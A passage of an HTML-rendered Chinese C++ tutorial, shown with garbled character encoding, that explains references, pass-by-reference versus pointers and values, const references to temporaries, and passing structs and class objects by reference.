çš„å€¼ä¹Ÿå˜æˆäº† 102</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;, rodents = &quot;</span> &lt;&lt; rodents &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: rats = 102, rodents = 102</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŸ¥çœ‹åœ°å€ï¼Œä¼šå‘ç°å®ƒä»¬æ˜¯ç›¸åŒçš„</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address of rats: &quot;</span> &lt;&lt; &amp;rats &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address of rodents: &quot;</span> &lt;&lt; &amp;rodents &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡ºç›¸åŒçš„åœ°å€</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// int&amp; bad_ref; // é”™è¯¯ï¼å¼•ç”¨å¿…é¡»åœ¨å£°æ˜æ—¶åˆå§‹åŒ–</span></span><br><span class="line">    <span class="comment">// double&amp; wrong_type = rats; // é”™è¯¯ï¼ç±»å‹ä¸åŒ¹é… (double&amp; vs int)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å…³é”®ç‚¹:</strong></p><ul><li>  å¼•ç”¨å¿…é¡»åœ¨å£°æ˜æ—¶åˆå§‹åŒ–ã€‚</li><li>  å¼•ç”¨ä¸€æ—¦åˆå§‹åŒ–ï¼Œå°±ä¸èƒ½å†æŒ‡å‘å…¶ä»–å˜é‡ã€‚å®ƒç»ˆç”Ÿéƒ½æ˜¯å…¶åˆå§‹å˜é‡çš„åˆ«åã€‚</li><li>  å¼•ç”¨æœ¬èº«ä¸å ç”¨ç‹¬ç«‹çš„å†…å­˜åœ°å€ï¼ˆæˆ–è€…è¯´ï¼Œå®ƒçš„åœ°å€å°±æ˜¯å®ƒæ‰€å¼•ç”¨å˜é‡çš„åœ°å€ï¼‰ã€‚</li></ul><h3 id="8-2-2-å°†å¼•ç”¨ç”¨ä½œå‡½æ•°å‚æ•°"><a href="#8-2-2-å°†å¼•ç”¨ç”¨ä½œå‡½æ•°å‚æ•°" class="headerlink" title="8.2.2 å°†å¼•ç”¨ç”¨ä½œå‡½æ•°å‚æ•°"></a>8.2.2 å°†å¼•ç”¨ç”¨ä½œå‡½æ•°å‚æ•°</h3><p>å¼•ç”¨æœ€é‡è¦å’Œæœ€å¸¸è§çš„ç”¨é€”ä¹‹ä¸€æ˜¯ä½œä¸ºå‡½æ•°å‚æ•°ï¼Œè¿™ç§°ä¸º**æŒ‰å¼•ç”¨ä¼ é€’ (Pass by Reference)**ã€‚å½“ä½¿ç”¨å¼•ç”¨ä½œä¸ºå‡½æ•°å‚æ•°æ—¶ï¼Œå‡½æ•°æ¥æ”¶çš„æ˜¯åŸå§‹å˜é‡çš„åˆ«åï¼Œè€Œä¸æ˜¯å‰¯æœ¬ã€‚è¿™æ„å‘³ç€å‡½æ•°å¯ä»¥ç›´æ¥è®¿é—®å¹¶ä¿®æ”¹è°ƒç”¨è€…ä½œç”¨åŸŸä¸­çš„åŸå§‹å˜é‡ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">function_name</span><span class="params">(type&amp; ref_parameter)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å¯ä»¥é€šè¿‡ ref_parameter ä¿®æ”¹åŸå§‹å®å‚</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ï¼šä½¿ç”¨å¼•ç”¨å‚æ•°äº¤æ¢ä¸¤ä¸ªå˜é‡çš„å€¼</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°ï¼šä½¿ç”¨å¼•ç”¨å‚æ•°äº¤æ¢ä¸¤ä¸ª int å˜é‡çš„å€¼</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap_ref</span><span class="params">(<span class="keyword">int</span>&amp; a, <span class="keyword">int</span>&amp; b)</span> </span>&#123; <span class="comment">// a å’Œ b æ˜¯è°ƒç”¨æ—¶ä¼ å…¥å˜é‡çš„åˆ«å</span></span><br><span class="line">    <span class="keyword">int</span> temp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">    <span class="comment">// å¯¹ a å’Œ b çš„ä¿®æ”¹ç›´æ¥å½±å“åŸå§‹å˜é‡</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¹æ¯”ï¼šä½¿ç”¨æŒ‡é’ˆå‚æ•°äº¤æ¢ (ä¼ ç»Ÿ C é£æ ¼)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap_ptr</span><span class="params">(<span class="keyword">int</span>* p_a, <span class="keyword">int</span>* p_b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp = *p_a;</span><br><span class="line">    *p_a = *p_b;</span><br><span class="line">    *p_b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¹æ¯”ï¼šä½¿ç”¨å€¼ä¼ é€’ (æ— æ³•äº¤æ¢åŸå§‹å˜é‡)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap_val</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">    <span class="comment">// åªä¿®æ”¹äº†å±€éƒ¨å‰¯æœ¬ a å’Œ b</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> wallet1 = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">int</span> wallet2 = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Original: wallet1 = &quot;</span> &lt;&lt; wallet1 &lt;&lt; <span class="string">&quot;, wallet2 = &quot;</span> &lt;&lt; wallet2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°è¯•ä½¿ç”¨å€¼ä¼ é€’äº¤æ¢ (å¤±è´¥)</span></span><br><span class="line">    swap_val(wallet1, wallet2);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After swap_val: wallet1 = &quot;</span> &lt;&lt; wallet1 &lt;&lt; <span class="string">&quot;, wallet2 = &quot;</span> &lt;&lt; wallet2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// å€¼ä¸å˜</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨å¼•ç”¨ä¼ é€’äº¤æ¢ (æˆåŠŸ)</span></span><br><span class="line">    swap_ref(wallet1, wallet2);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After swap_ref: wallet1 = &quot;</span> &lt;&lt; wallet1 &lt;&lt; <span class="string">&quot;, wallet2 = &quot;</span> &lt;&lt; wallet2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// å€¼å·²äº¤æ¢</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å†æ¬¡äº¤æ¢å›æ¥ï¼Œä½¿ç”¨æŒ‡é’ˆä¼ é€’ (æˆåŠŸ)</span></span><br><span class="line">    swap_ptr(&amp;wallet1, &amp;wallet2); <span class="comment">// æ³¨æ„éœ€è¦ä¼ é€’åœ°å€</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After swap_ptr: wallet1 = &quot;</span> &lt;&lt; wallet1 &lt;&lt; <span class="string">&quot;, wallet2 = &quot;</span> &lt;&lt; wallet2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// å€¼å†æ¬¡äº¤æ¢å›æ¥</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æŒ‰å¼•ç”¨ä¼ é€’ vs. æŒ‰æŒ‡é’ˆä¼ é€’:</strong></p><ul><li>  <strong>è¯­æ³•:</strong> å¼•ç”¨ä¼ é€’çš„è°ƒç”¨è¯­æ³•æ›´ç®€æ´è‡ªç„¶ (<code>swap_ref(a, b)</code>)ï¼Œè€ŒæŒ‡é’ˆä¼ é€’éœ€è¦æ˜¾å¼è·å–åœ°å€ (<code>swap_ptr(&amp;a, &amp;b)</code>) å¹¶åœ¨å‡½æ•°å†…éƒ¨è§£å¼•ç”¨ (<code>*p_a</code>)ã€‚</li><li>  <strong>ç©ºå€¼:</strong> æŒ‡é’ˆå¯ä»¥ä¸º <code>nullptr</code>ï¼Œéœ€è¦åœ¨ä½¿ç”¨å‰æ£€æŸ¥ã€‚å¼•ç”¨é€šå¸¸ï¼ˆåœ¨æ ‡å‡†ç”¨æ³•ä¸‹ï¼‰ä¸ä¼šæ˜¯â€œç©ºâ€çš„ï¼Œå› ä¸ºå®ƒå¿…é¡»å¼•ç”¨ä¸€ä¸ªå·²å­˜åœ¨çš„å¯¹è±¡ã€‚è¿™ä½¿å¾—å¼•ç”¨åœ¨æŸäº›æƒ…å†µä¸‹æ›´å®‰å…¨ã€‚</li><li>  <strong>ç›®çš„:</strong> ä¸¤è€…éƒ½å¯ä»¥ç”¨æ¥å…è®¸å‡½æ•°ä¿®æ”¹è°ƒç”¨è€…çš„å˜é‡ï¼Œä»¥åŠé¿å…å¤§å‹å¯¹è±¡çš„å¤åˆ¶å¼€é”€ã€‚</li></ul><h3 id="8-2-3-å¼•ç”¨çš„å±æ€§å’Œç‰¹åˆ«ä¹‹å¤„"><a href="#8-2-3-å¼•ç”¨çš„å±æ€§å’Œç‰¹åˆ«ä¹‹å¤„" class="headerlink" title="8.2.3 å¼•ç”¨çš„å±æ€§å’Œç‰¹åˆ«ä¹‹å¤„"></a>8.2.3 å¼•ç”¨çš„å±æ€§å’Œç‰¹åˆ«ä¹‹å¤„</h3><ol><li> <strong>å¿…é¡»åˆå§‹åŒ–:</strong> å¦‚å‰æ‰€è¿°ï¼Œå¼•ç”¨åœ¨å£°æ˜æ—¶å¿…é¡»ç»‘å®šåˆ°ä¸€ä¸ªå·²å­˜åœ¨çš„å¯¹è±¡ã€‚</li><li> <strong>ä¸å¯é‡æ–°ç»‘å®š:</strong> å¼•ç”¨ä¸èƒ½åœ¨åˆå§‹åŒ–åæ›´æ”¹å…¶å¼•ç”¨çš„å¯¹è±¡ã€‚</li><li> <strong>è¡Œä¸ºåƒåŸå˜é‡:</strong> å¯¹å¼•ç”¨çš„æ“ä½œï¼ˆèµ‹å€¼ã€å–åœ°å€ç­‰ï¼‰é€šå¸¸è¡¨ç°å¾—å°±åƒç›´æ¥å¯¹åŸå§‹å˜é‡æ“ä½œä¸€æ ·ã€‚</li><li><strong>ä¸´æ—¶å˜é‡å’Œ <code>const</code> å¼•ç”¨:</strong> é€šå¸¸ï¼Œä¸èƒ½å°†å¼•ç”¨ç»‘å®šåˆ°ä¸´æ—¶å˜é‡æˆ–å­—é¢å€¼ã€‚ä½†æœ‰ä¸€ä¸ªé‡è¦çš„ä¾‹å¤–ï¼š<strong>å¸¸é‡å¼•ç”¨ (<code>const type&amp;</code>)</strong> å¯ä»¥ç»‘å®šåˆ°ä¸´æ—¶å˜é‡ã€å­—é¢å€¼æˆ–ç±»å‹ç¨æœ‰ä¸åŒçš„å˜é‡ï¼ˆå¦‚æœå¯ä»¥è¿›è¡Œéšå¼è½¬æ¢ï¼‰ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span> value = <span class="number">3.14</span>;</span><br><span class="line"><span class="comment">// int&amp; ref_val = value; // é”™è¯¯ï¼šç±»å‹ä¸åŒ¹é…</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span>&amp; const_ref_val = value; <span class="comment">// åˆæ³•ï¼åˆ›å»ºäº†ä¸€ä¸ªä¸´æ—¶çš„ int(3)ï¼Œconst_ref_val å¼•ç”¨è¿™ä¸ªä¸´æ—¶å˜é‡</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">double</span>&amp; ref_literal = <span class="number">5.0</span> * <span class="number">2.0</span>; <span class="comment">// åˆæ³•ï¼å¼•ç”¨ä¸€ä¸ªä¸´æ—¶ double(10.0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> num = <span class="number">100L</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span>&amp; ref_num = num; <span class="comment">// åˆæ³•ï¼å¼•ç”¨ä¸€ä¸ªä¸´æ—¶çš„ int(100)</span></span><br></pre></td></tr></table></figure> è¿™ç§ç‰¹æ€§ä½¿å¾—å¸¸é‡å¼•ç”¨åœ¨å‡½æ•°å‚æ•°ä¸­éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå®ƒä»¬å¯ä»¥æ¥å—æ›´å¹¿æ³›çš„å®å‚ç±»å‹ï¼ˆåŒ…æ‹¬å­—é¢å€¼å’Œéœ€è¦ç±»å‹è½¬æ¢çš„å€¼ï¼‰ï¼ŒåŒæ—¶ä¿è¯å‡½æ•°ä¸ä¼šä¿®æ”¹å®ƒä»¬ã€‚</li></ol><h3 id="8-2-4-å°†å¼•ç”¨ç”¨äºç»“æ„"><a href="#8-2-4-å°†å¼•ç”¨ç”¨äºç»“æ„" class="headerlink" title="8.2.4 å°†å¼•ç”¨ç”¨äºç»“æ„"></a>8.2.4 å°†å¼•ç”¨ç”¨äºç»“æ„</h3><p>æŒ‰å¼•ç”¨ä¼ é€’å¯¹äºç»“æ„ä½“ç‰¹åˆ«æœ‰ç”¨ï¼Œå› ä¸ºå®ƒå¯ä»¥é¿å…å¤åˆ¶æ•´ä¸ªç»“æ„ä½“ï¼ˆå¯èƒ½åŒ…å«è®¸å¤šæˆå‘˜ï¼‰çš„å¼€é”€ã€‚å¦‚æœå‡½æ•°ä¸éœ€è¦ä¿®æ”¹ç»“æ„ä½“ï¼Œåº”ä½¿ç”¨å¸¸é‡å¼•ç”¨ (<code>const struct_type&amp;</code>)ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Product</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;</span><br><span class="line">    <span class="keyword">double</span> price;</span><br><span class="line">    <span class="keyword">int</span> quantity;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’ç»“æ„ï¼Œé¿å…å¤åˆ¶ä¸”ä¸ä¿®æ”¹</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_product</span><span class="params">(<span class="keyword">const</span> Product&amp; prod)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Product Name: &quot;</span> &lt;&lt; prod.name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Price: $&quot;</span> &lt;&lt; prod.price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Quantity: &quot;</span> &lt;&lt; prod.quantity &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// prod.price = 0.0; // é”™è¯¯ï¼ä¸èƒ½é€šè¿‡ const å¼•ç”¨ä¿®æ”¹</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æŒ‰å¼•ç”¨ä¼ é€’ç»“æ„ï¼Œå…è®¸ä¿®æ”¹</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">apply_discount</span><span class="params">(Product&amp; prod, <span class="keyword">double</span> discount_percentage)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (discount_percentage &gt; <span class="number">0</span> &amp;&amp; discount_percentage &lt; <span class="number">100</span>) &#123;</span><br><span class="line">        prod.price *= (<span class="number">1.0</span> - discount_percentage / <span class="number">100.0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Product laptop = &#123;<span class="string">&quot;Laptop Pro&quot;</span>, <span class="number">1200.0</span>, <span class="number">10</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--- Initial Product ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    display_product(laptop); <span class="comment">// é«˜æ•ˆä¼ é€’ï¼Œä¸å¤åˆ¶</span></span><br><span class="line"></span><br><span class="line">    apply_discount(laptop, <span class="number">10.0</span>); <span class="comment">// ä¼ é€’å¼•ç”¨ä»¥ä¿®æ”¹ä»·æ ¼</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- Product After 10% Discount ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    display_product(laptop); <span class="comment">// å†æ¬¡é«˜æ•ˆä¼ é€’</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-2-5-å°†å¼•ç”¨ç”¨äºç±»å¯¹è±¡"><a href="#8-2-5-å°†å¼•ç”¨ç”¨äºç±»å¯¹è±¡" class="headerlink" title="8.2.5 å°†å¼•ç”¨ç”¨äºç±»å¯¹è±¡"></a>8.2.5 å°†å¼•ç”¨ç”¨äºç±»å¯¹è±¡</h3><p>å°†å¼•ç”¨ç”¨äºç±»å¯¹è±¡ä¸ç”¨äºç»“æ„ä½“å®Œå…¨ç›¸åŒã€‚æŒ‰å¸¸é‡å¼•ç”¨ (<code>const class_type&amp;</code>) ä¼ é€’æ˜¯é¿å…å¤åˆ¶å¤§å‹å¯¹è±¡å¹¶ç¡®ä¿å‡½æ•°ä¸ä¿®æ”¹å¯¹è±¡çŠ¶æ€çš„æ ‡å‡†åšæ³•ã€‚å¦‚æœéœ€è¦ä¿®æ”¹å¯¹è±¡ï¼Œåˆ™ä½¿ç”¨æ™®é€šå¼•ç”¨ (<code>class_type&amp;</code>)ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Student(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; n) : name(n) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">add_grade</span><span class="params">(<span class="keyword">int</span> g)</span> </span>&#123; grades.push_back(g); &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print_info</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="comment">// const æˆå‘˜å‡½æ•°</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Student: &quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;, Grades: &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> g : grades) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; g &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; <span class="title">get_name</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> name; &#125; <span class="comment">// è¿”å›å¸¸é‡å¼•ç”¨</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; grades;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’ç±»å¯¹è±¡</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_student_summary</span><span class="params">(<span class="keyword">const</span> Student&amp; s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Summary for &quot;</span> &lt;&lt; s.get_name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    s.print_info(); <span class="comment">// å¯ä»¥è°ƒç”¨ const æˆå‘˜å‡½æ•°</span></span><br><span class="line">    <span class="comment">// s.add_grade(100); // é”™è¯¯ï¼ä¸èƒ½é€šè¿‡ const å¼•ç”¨è°ƒç”¨é const æˆå‘˜å‡½æ•°</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Student <span class="title">alice</span><span class="params">(<span class="string">&quot;Alice&quot;</span>)</span></span>;</span><br><span class="line">    alice.add_grade(<span class="number">95</span>);</span><br><span class="line">    alice.add_grade(<span class="number">88</span>);</span><br><span class="line"></span><br><span class="line">    show_student_summary(alice); <span class="comment">// é«˜æ•ˆä¼ é€’ï¼Œä¸å¤åˆ¶</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-2-6-å¯¹è±¡ã€ç»§æ‰¿å’Œå¼•ç”¨"><a href="#8-2-6-å¯¹è±¡ã€ç»§æ‰¿å’Œå¼•ç”¨" class="headerlink" title="8.2.6 å¯¹è±¡ã€ç»§æ‰¿å’Œå¼•ç”¨"></a>8.2.6 å¯¹è±¡ã€ç»§æ‰¿å’Œå¼•ç”¨</h3><p>å½“ä¸ç±»ç»§æ‰¿ç»“åˆä½¿ç”¨æ—¶ï¼ŒåŸºç±»çš„å¼•ç”¨å¯ä»¥æŒ‡å‘æ´¾ç”Ÿç±»çš„å¯¹è±¡ã€‚è¿™æ˜¯å®ç°<strong>å¤šæ€ (Polymorphism)</strong> çš„å…³é”®æœºåˆ¶ä¹‹ä¸€ï¼ˆä¸æŒ‡é’ˆç±»ä¼¼ï¼‰ã€‚é€šè¿‡åŸºç±»å¼•ç”¨è°ƒç”¨è™šå‡½æ•°æ—¶ï¼Œä¼šæ‰§è¡Œæ´¾ç”Ÿç±»ä¸­ç›¸åº”çš„ç‰ˆæœ¬ã€‚è¿™éƒ¨åˆ†å†…å®¹å°†åœ¨åç»­ç« èŠ‚ï¼ˆå¦‚ç¬¬ 13 ç« ï¼‰è¯¦ç»†ä»‹ç»ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ¦‚å¿µé¢„è§ˆ (å°†åœ¨åç»­ç« èŠ‚è¯¦ç»†è®²è§£)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::show()&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~Base() &#123;&#125; <span class="comment">// è™šææ„å‡½æ•°</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Derived</span> :</span> <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> 